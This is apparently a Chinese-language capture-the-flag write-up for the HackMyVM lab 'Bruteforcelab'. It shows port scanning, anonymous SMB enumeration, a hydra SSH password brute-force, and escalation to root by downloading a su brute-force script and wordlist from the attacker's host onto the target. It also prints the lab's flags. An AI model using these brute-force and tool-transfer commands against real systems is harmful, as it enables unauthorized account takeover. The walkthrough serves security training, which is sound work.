---
title: Bruteforcelab
author: hgbe02
date: 2024-04-23
categories: [Training platform,Hackmyvm]  
tags: [Hackmyvm,web]  
permalink: "/Hackmyvm/Bruteforcelab.html"
---

# Bruteforcelab

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404231740713.png" alt="image-20240423163003127" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404231740714.png" alt="image-20240423163034566" style="zoom:50%;" />

## 信息搜集

### 端口扫描

```bash
┌──(kali💀kali)-[~/temp/Bruteforcelab]
└─$ rustscan -a 192.168.0.157 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 192.168.0.157:22
Open 192.168.0.157:10000
Open 192.168.0.157:19000
Open 192.168.0.157:19222
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-23 04:31 EDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 04:31
Completed NSE at 04:31, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 04:31
Completed NSE at 04:31, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 04:31
Completed NSE at 04:31, 0.00s elapsed
Initiating Ping Scan at 04:31
Scanning 192.168.0.157 [2 ports]
Completed Ping Scan at 04:31, 0.00s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 04:31
Completed Parallel DNS resolution of 1 host. at 04:31, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 1, NX: 0, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 04:31
Scanning LAB-Bruteforce (192.168.0.157) [4 ports]
Discovered open port 22/tcp on 192.168.0.157
Discovered open port 10000/tcp on 192.168.0.157
Discovered open port 19000/tcp on 192.168.0.157
Discovered open port 19222/tcp on 192.168.0.157
Completed Connect Scan at 04:31, 0.00s elapsed (4 total ports)
Initiating Service scan at 04:31
Scanning 4 services on LAB-Bruteforce (192.168.0.157)
Completed Service scan at 04:31, 53.63s elapsed (4 services on 1 host)
NSE: Script scanning 192.168.0.157.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 04:31
Completed NSE at 04:32, 30.02s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 04:32
Completed NSE at 04:32, 0.01s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 04:32
Completed NSE at 04:32, 0.00s elapsed
Nmap scan report for LAB-Bruteforce (192.168.0.157)
Host is up, received conn-refused (0.00055s latency).
Scanned at 2024-04-23 04:31:03 EDT for 83s

PORT      STATE SERVICE     REASON  VERSION
22/tcp    open  ssh         syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 1c:db:f8:92:72:c4:72:dc:24:c3:ca:7c:80:eb:f4:81 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCnDkPWhcxcSZLNBWkDl1eizSw9a6bUKoMUvNUJCznGf8ExJ0o+7tPsdJsNDObU0Ap/dX6apZ2aBslLi/BJ0bMPCDF0Ovp1QErgm2PtgxK3W0VUR3tvXIKv8gwYpEQgpwhmF+bWrbEBFdLK/rtBDLFXiTYqYOMo7hriswsBY6/eLJo7roRvVDJmg0aDwTMs6cjSGVWTBkRipQrRfggl53gpnFxg90yiibGs2JT6GSOxGalVLotOMBl+pGGkxStgcVYA11LK6zNY2kCfmuh+n/DRftdMdNl+vnpUOaXo8oX0Wk0Zqd2YNjlUYA2yjZVMMUjf6ORZkjYe3wc5SADkQvUZTuyuWS9DKFxS6Y0wEBIdVdP6fj4aXC1cEkYq3hdSr2B8LIs7BBy1WWdordqdU5MAP3hw+VtFGIpLRRl9hHPYVri7qGw/dmnJKzNa5BUosHAebgr56WKTKxvbCf+Wn6KFbJEphGS/hEjvOcMwpIwYQbjg9V7y+HPL47vL/huIpBU=
|   256 7f:30:33:e2:f4:0d:87:41:5e:a3:24:de:57:c6:73:8b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKDLqka8T9BdXD7sEjNdCNvaWN2nI97c0JiyTL/WQ+oCrt2oc6umIuUSbCX2L7yzX1Q2sirMixb/EFMc/ASYE7E=
|   256 9a:9e:2f:53:e0:2b:b4:98:3f:34:95:53:56:87:a4:76 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK94OoXaK+BKuXw2YeGlhV8wIhcK5uhHJoTWStinBxAY
10000/tcp open  http        syn-ack MiniServ 2.021 (Webmin httpd)
|_http-favicon: Unknown favicon MD5: 9244C0A07ADF94BFD888D463CF479411
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: 200 &mdash; Document follows
19000/tcp open  netbios-ssn syn-ack Samba smbd 4.6.2
19222/tcp open  netbios-ssn syn-ack Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 04:32
Completed NSE at 04:32, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 04:32
Completed NSE at 04:32, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 04:32
Completed NSE at 04:32, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 83.95 seconds
```

## 漏洞发现

### 踩点

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404231740715.png" alt="image-20240423163715248" style="zoom:50%;" />

### 敏感端口

发现`19000`和`19222`都开放了smb服务，尝试查看一下：

```bash
┌──(kali💀kali)-[~/temp/Bruteforcelab]
└─$ smbclient -L //192.168.0.157// -p 19000
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        Test            Disk      
        IPC$            IPC       IPC Service (Samba 4.13.13-Debian)
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.0.157 failed (Error NT_STATUS_CONNECTION_REFUSED)
Unable to connect with SMB1 -- no workgroup available
```

```bash
┌──(kali💀kali)-[~/temp/Bruteforcelab]
└─$ smbclient -L //192.168.0.157// -p 19222
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        Test            Disk      
        IPC$            IPC       IPC Service (Samba 4.13.13-Debian)
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.0.157 failed (Error NT_STATUS_CONNECTION_REFUSED)
Unable to connect with SMB1 -- no workgroup available
```

尝试连接一下：

```bash
┌──(kali💀kali)-[~/temp/Bruteforcelab]
└─$ smbclient //192.168.0.157/test -p 19000 
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls -la
NT_STATUS_NO_SUCH_FILE listing \-la
smb: \> ls
  .                                   D        0  Sun Mar 26 15:06:46 2023
  ..                                  D        0  Sun Mar 26 14:12:02 2023
  README.txt                          N      115  Sun Mar 26 15:06:46 2023

                9232860 blocks of size 1024. 3052692 blocks available
smb: \> get README.txt 
getting file \README.txt of size 115 as README.txt (5.1 KiloBytes/sec) (average 5.1 KiloBytes/sec)
smb: \> exit
                                                                                                                                                        
┌──(kali💀kali)-[~/temp/Bruteforcelab]
└─$ cat README.txt 
Hey Andrea listen to me, I'm going to take a break. I think I've setup this prototype for the SMB server correctly
                                                                                                                                                        
┌──(kali💀kali)-[~/temp/Bruteforcelab]
└─$ smbclient //192.168.0.157/test -p 19222
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Mar 26 15:06:46 2023
  ..                                  D        0  Sun Mar 26 14:12:02 2023
  README.txt                          N      115  Sun Mar 26 15:06:46 2023

                9232860 blocks of size 1024. 3052692 blocks available
smb: \> get README.txt 
getting file \README.txt of size 115 as README.txt (56.1 KiloBytes/sec) (average 56.2 KiloBytes/sec)
smb: \> exit
                                                                                                                                                        
┌──(kali💀kali)-[~/temp/Bruteforcelab]
└─$ cat README.txt 
Hey Andrea listen to me, I'm going to take a break. I think I've setup this prototype for the SMB server correctly
```

### 爆破ssh

获取到了用户`Andrea`，尝试进行爆破：

```bash
┌──(kali💀kali)-[~/temp/Bruteforcelab]
└─$ hydra -l andrea -P /usr/share/wordlists/rockyou.txt ssh://192.168.0.157:22 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-04-23 04:55:42
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.168.0.157:22/
[STATUS] 138.00 tries/min, 138 tries in 00:01h, 14344263 to do in 1732:24h, 14 active
[STATUS] 98.67 tries/min, 296 tries in 00:03h, 14344105 to do in 2422:60h, 14 active
[STATUS] 92.29 tries/min, 646 tries in 00:07h, 14343755 to do in 2590:28h, 14 active
[22][ssh] host: 192.168.0.157   login: andrea   password: awesome
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-04-23 05:05:24
```

尝试进行连接：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404231740716.png" alt="image-20240423165706006" style="zoom:50%;" />

## 提权

### 信息搜集

```bash
andrea@LAB-Bruteforce:~$ ls -la
total 40
drwxr-xr-x 5 andrea andrea 4096 Mar 26  2023 .
drwxr-xr-x 4 root   root   4096 Mar 26  2023 ..
-rw------- 1 andrea andrea  583 Mar 26  2023 .bash_history
-rw-r--r-- 1 andrea andrea  220 Mar 26  2023 .bash_logout
-rw-r--r-- 1 andrea andrea 3526 Mar 26  2023 .bashrc
drwxr-xr-x 4 andrea andrea 4096 Mar 26  2023 .cache
drwxr-xr-x 5 andrea andrea 4096 Mar 26  2023 .config
drwxr-xr-x 3 andrea andrea 4096 Mar 26  2023 .local
-rw-r--r-- 1 andrea andrea  807 Mar 26  2023 .profile
-rw-r--r-- 1 andrea andrea   33 Mar 26  2023 user.txt
andrea@LAB-Bruteforce:~$ cat user.txt 
d5eb7d8b6f57c295e0bedf7eef531360
andrea@LAB-Bruteforce:~$ sudo -l
[sudo] password for andrea: 
Sorry, user andrea may not run sudo on Lab-Bruteforce.
andrea@LAB-Bruteforce:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
tss:x:103:109:TPM software stack,,,:/var/lib/tpm:/bin/false
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:105:111:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
avahi-autoipd:x:106:115:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:108:116:RealtimeKit,,,:/proc:/usr/sbin/nologin
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
avahi:x:110:117:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
speech-dispatcher:x:111:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
pulse:x:112:119:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin
saned:x:113:122::/var/lib/saned:/usr/sbin/nologin
colord:x:114:123:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:115:124::/var/lib/geoclue:/usr/sbin/nologin
Debian-gdm:x:116:125:Gnome Display Manager:/var/lib/gdm3:/bin/false
mattia:x:1000:1000:mattia,,,:/home/mattia:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
sshd:x:117:65534::/run/sshd:/usr/sbin/nologin
andrea:x:1001:1001:,,,:/home/andrea:/bin/bash
andrea@LAB-Bruteforce:~$ find / -perm -u=s -type f 2>/dev/null
/usr/libexec/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/xorg/Xorg.wrap
/usr/sbin/pppd
/usr/bin/pkexec
/usr/bin/su
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/mount
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/fusermount3
/usr/bin/ntfs-3g
andrea@LAB-Bruteforce:~$ /usr/sbin/getcap -r / 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
/usr/bin/gnome-keyring-daemon cap_ipc_lock=ep
/usr/bin/ping cap_net_raw=ep
andrea@LAB-Bruteforce:~$ cd ..
andrea@LAB-Bruteforce:/home$ ls -la
total 16
drwxr-xr-x  4 root   root   4096 Mar 26  2023 .
drwxr-xr-x 19 root   root   4096 Mar 26  2023 ..
drwxr-xr-x  5 andrea andrea 4096 Mar 26  2023 andrea
drwxr-xr-x 17 mattia mattia 4096 Mar 26  2023 mattia
andrea@LAB-Bruteforce:/home$ cd mattia/
andrea@LAB-Bruteforce:/home/mattia$ ls -la
total 84
drwxr-xr-x 17 mattia mattia 4096 Mar 26  2023 .
drwxr-xr-x  4 root   root   4096 Mar 26  2023 ..
-rw-------  1 mattia mattia  619 Mar 26  2023 .bash_history
-rw-r--r--  1 mattia mattia  220 Mar 26  2023 .bash_logout
-rw-r--r--  1 mattia mattia 3526 Mar 26  2023 .bashrc
drwx------ 12 mattia mattia 4096 Mar 26  2023 .cache
drwx------ 13 mattia mattia 4096 Mar 26  2023 .config
drwx------  2 mattia mattia 4096 Mar 26  2023 .gnupg
drwx------  3 mattia mattia 4096 Mar 26  2023 .local
drwx------  4 mattia mattia 4096 Mar 26  2023 .mozilla
-rw-r--r--  1 mattia mattia  807 Mar 26  2023 .profile
drwx------  2 mattia mattia 4096 Mar 26  2023 .ssh
drwxr-xr-x  2 mattia mattia 4096 Mar 26  2023 Desktop
drwxr-xr-x  2 mattia mattia 4096 Mar 26  2023 Documents
drwxr-xr-x  2 mattia mattia 4096 Mar 26  2023 Downloads
drwxr-xr-x  2 mattia mattia 4096 Mar 26  2023 Music
drwxr-xr-x  2 mattia mattia 4096 Mar 26  2023 Pictures
drwxr-xr-x  2 mattia mattia 4096 Mar 26  2023 Public
drwxr-xr-x  2 mattia mattia 4096 Mar 26  2023 Templates
drwxr-xr-x  2 mattia mattia 4096 Mar 26  2023 Videos
drwxr-xr-x  2 root   root   4096 Mar 26  2023 testFolder
```

### 尝试爆破本地用户的密码

之前记得有个靶机是这么干的，尝试一下：

```bash
andrea@LAB-Bruteforce:/tmp$ wget http://192.168.0.143:8888/suBF.sh
--2024-04-23 11:11:55--  http://192.168.0.143:8888/suBF.sh
Connecting to 192.168.0.143:8888... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2340 (2.3K) [text/x-sh]
Saving to: ‘suBF.sh’

suBF.sh                               100%[=========================================================================>]   2.29K  --.-KB/s    in 0.01s   

2024-04-23 11:11:55 (212 KB/s) - ‘suBF.sh’ saved [2340/2340]

andrea@LAB-Bruteforce:/tmp$ chmod +x suBF.sh 
andrea@LAB-Bruteforce:/tmp$ wget http://192.168.0.143:8888/top12000.txt
--2024-04-23 11:12:15--  http://192.168.0.143:8888/top12000.txt
Connecting to 192.168.0.143:8888... connected.
HTTP request sent, awaiting response... 200 OK
Length: 100205 (98K) [text/plain]
Saving to: ‘top12000.txt’

top12000.txt                          100%[=========================================================================>]  97.86K   176KB/s    in 0.6s    

2024-04-23 11:12:16 (176 KB/s) - ‘top12000.txt’ saved [100205/100205]

andrea@LAB-Bruteforce:/tmp$ ./suBF.sh 
This tool bruteforces a selected user using binary su and as passwords: null password, username, reverse username and a wordlist (top12000.txt).
You can specify a username using -u <username> and a wordlist via -w <wordlist>.
By default the BF default speed is using 100 su processes at the same time (each su try last 0.7s and a new su try in 0.007s) ~ 143s to complete
You can configure this times using -t (timeout su process) ans -s (sleep between 2 su processes).
Fastest recommendation: -t 0.5 (minimun acceptable) and -s 0.003 ~ 108s to complete

Example:    ./suBF.sh -u <USERNAME> [-w top12000.txt] [-t 0.7] [-s 0.007]

THE USERNAME IS CASE SENSITIVE AND THIS SCRIPT DOES NOT CHECK IF THE PROVIDED USERNAME EXIST, BE CAREFUL

andrea@LAB-Bruteforce:/tmp$ ./suBF.sh -u root 
  [+] Bruteforcing root...
^C
andrea@LAB-Bruteforce:/tmp$ ./suBF.sh -u root -t 0.5 -s 0.003
  [+] Bruteforcing root...
Wordlist exhausted
```

查看师傅们的wp，发现是用了一个叫做`sucrack`的工具，尝试一下：

```bash
git clone https://github.com/hemp3l/sucrack.git
cd sucrack
./configure
sudo make
sudo make install
cd src
python3 -m http.server 8888
```

```bash
andrea@LAB-Bruteforce:/tmp$ wget http://192.168.0.143:8888/sucrack
--2024-04-23 11:24:06--  http://192.168.0.143:8888/sucrack
Connecting to 192.168.0.143:8888... connected.
HTTP request sent, awaiting response... 200 OK
Length: 72376 (71K) [application/octet-stream]
Saving to: ‘sucrack’

sucrack                               100%[=========================================================================>]  70.68K  --.-KB/s    in 0s      

2024-04-23 11:24:06 (192 MB/s) - ‘sucrack’ saved [72376/72376]

andrea@LAB-Bruteforce:/tmp$ chmod +x sucrack
andrea@LAB-Bruteforce:/tmp$ ./su
suBF.sh  sucrack  
andrea@LAB-Bruteforce:/tmp$ ./su
suBF.sh  sucrack  
andrea@LAB-Bruteforce:/tmp$ ./su
suBF.sh  sucrack  
andrea@LAB-Bruteforce:/tmp$ ./sucrack 
./sucrack: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.33' not found (required by ./sucrack)
./sucrack: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./sucrack)
```

额。

只能再用前面的那个了，按理来说密码也在其中的，没爆破出来可能是太快了。

```bash
andrea@LAB-Bruteforce:/tmp$ grep "1998" top12000.txt 
1998
andrea@LAB-Bruteforce:/tmp$ ./suBF.sh -u root -w top12000.txt -t 0.7 -s 0.007
  [+] Bruteforcing root...
  You can login as root using password: 1998
```

看来还是不能太急功近利啊！尝试使用密码`1998`进行登录！

```bash
andrea@LAB-Bruteforce:~$ su root
Password: 
root@LAB-Bruteforce:/home/andrea# cd /root
root@LAB-Bruteforce:~# ls -la
total 44
drwx------  5 root root 4096 Mar 26  2023 .
drwxr-xr-x 19 root root 4096 Mar 26  2023 ..
-rw-------  1 root root 2186 Mar 26  2023 .bash_history
-rw-r--r--  1 root root  571 Apr 10  2021 .bashrc
drwx------  3 root root 4096 Mar 26  2023 .cache
drwxr-xr-x  3 root root 4096 Mar 26  2023 .local
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
drwxr-xr-x  2 root root 4096 Mar 26  2023 .tmp
-rw-r--r--  1 root root   51 Mar 26  2023 root.txt
-r-xr-xr-x  1 root root 7244 Mar 26  2023 vboxpostinstall.sh
root@LAB-Bruteforce:~# cat root.txt 
Congratulations.

d2f74ec1ca3e40f6fa07f62d42eb9ea5
root@LAB-Bruteforce:~# head vboxpostinstall.sh 
#!/bin/bash
## @file
# Post installation script template for debian-like distros.
#
# Note! This script expects to be running w/o chroot.
# Note! When using ubiquity, this is run after installation logs have
#       been copied to /var/log/installation.
#

#
root@LAB-Bruteforce:~# cat .bash_history 
sudo apt install openssh-server
clear
ssh
ifconfig
ipconfig
sudo apt install net-tools
clear
```

拿到flag。。。

